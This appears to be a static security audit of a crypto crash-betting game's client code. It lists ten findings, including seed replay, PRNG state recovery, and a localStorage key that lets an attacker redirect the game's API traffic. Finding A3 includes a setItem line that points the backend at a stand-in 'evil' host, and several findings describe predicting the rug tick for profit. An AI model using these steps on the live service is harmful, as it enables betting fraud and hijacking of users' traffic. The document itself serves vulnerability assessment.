10 vectors — static only

HIGHA1Full price-curve replay from serverSeed reveal

Once serverSeed is revealed, s(serverSeed, roundId, externalHash) produces the exact price array — including the rug tick — in milliseconds offline. The client already imports both seedrandom AND generatePrices for the past-rounds verifier UI. If any WS frame contains serverSeed before all users have cashed out (e.g. the client fetches it to animate the reveal), the window between reveal and visual rug is exploitable.

how to verify

Record WS frames end-to-end on a real round; check if `game:standard:roundState` or similar ever includes `provablyFair.serverSeed` before `phase=settling`.

HIGHA2UUID-v7 seed-collision across rounds

isUuidWith7InPos14(roundId) collapses the seed to serverSeed alone — roundId does not mix in. UUID v7 ALWAYS has '7' at position 14 (that's the version nibble). Any time rugs uses v7 round IDs, two rounds that share serverSeed produce identical price curves (same rug tick, same god candle, same big moves). Operator must rotate serverSeed per round or every v7 round using a repeat seed is a replay.

how to verify

Collect reveals across ~100 rounds; compute SHA256(priceArray) and check for duplicates. Also detect duplicate serverSeed strings.

HIGHA3Backend URL overridable via localStorage

backendConfig.js reads `api-assign:backend` from localStorage with no origin lock. A browser-extension or XSS vector that writes { backendUrl, apiUrl } to that key redirects ALL API + WS calls to an attacker-controlled host. The attacker becomes the betting server for that user.

how to verify

localStorage.setItem('api-assign:backend', JSON.stringify({ backendUrl: 'https://evil', apiUrl: 'https://evil/api' })); reload. Trivially verifies.

MEDA4seedrandom (Alea variant) PRNG state recovery

The imported seedrandom is Alea per bundle naming. Alea maintains ~96 bits of mutable state. State can be recovered by SMT solvers from ~10–15 observed Alea outputs. If an attacker observes the first ~15 price ticks live (via `game:standard:tick` as a spectator) and reverse-engineers the exact pattern of drift/big-move/god-candle calls per tick, they can reconstruct the RNG state and predict every subsequent tick INCLUDING the rug — WITHOUT needing serverSeed.

how to verify

Pin the seedrandom variant (Alea confirmed by file size 7804 B). Build state-recovery PoC consuming 15–20 tick observations.

MEDA5God-candle EV asymmetry at low u

GOD_CANDLE_CHANCE=1e-5 triggers only when u ≤ 100 (base-multiplier units). At u=1, 10× payoff on 1e-5 base rate per tick → EV contribution 1e-4 per tick, over ~200 expected ticks before rug = +2% EV from god candles alone. Users who hold through drawdowns (never cashing out before rug) capture more of this asymmetric payoff than typical gameplay suggests.

how to verify

Monte Carlo 1M rounds using the recovered algorithm. Compare empirical EV with and without the god-candle branch at different hold-strategies.

MEDA6shortLiquidation / sidebet payouts are deterministic

Both long and short positions have known liquidation formulas pulled from the client (max loss = margin, liquidation threshold set at position open). Any attacker with the recovered price curve knows liquidation ticks before they happen. They can place a long + short against each other OR play the sidebet market using the known rug tick.

how to verify

Dump the position-liquidation code from index-BAkaiU5I.js; cross-reference with recovered price arrays.

MEDA7Candleflip localStorage double-count race

Candleflip bets persist to localStorage with heartbeat per tab. Two tabs with same account could race the resolution handler: one submits, closes abruptly (writes 'orphaned'), the other picks up and may re-attempt. Not a free-money bug, but a trust-boundary hole worth probing.

how to verify

Two tabs, same account; submit bet in tab A, close tab A hard (kill process); observe tab B.

LOWA8requestId validator client-only

`/^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i` validates request IDs client-side only. If the server echoes the client-provided requestId without re-validating ownership, forged well-formed UUIDs could spoof reports.

how to verify

Needs live probe (out of static scope).

LOWA9Sentry debug IDs leak build commit

Every chunk embeds SENTRY_RELEASE={id:'e2e705c2d20718926e9d73a490458f2da71d81ba'}. That's a git commit hash. If the repo is public (jinjinjo/rugs or similar) this leaks the exact revision for correlating findings to source.

how to verify

Search GitHub for the commit SHA; check if any public rugs repo contains it.

INFOA10Backend URL + API URL bootstrappable from Vite env

VITE_BACKEND_URL and VITE_API_URL compile-baked into the bundle. These leak the production endpoints verbatim and can be hit directly, bypassing the CDN edge filtering (CF Access or similar) if the origin IP is reachable.

how to verify

Extract from backendConfig constants; test direct hit with curl.
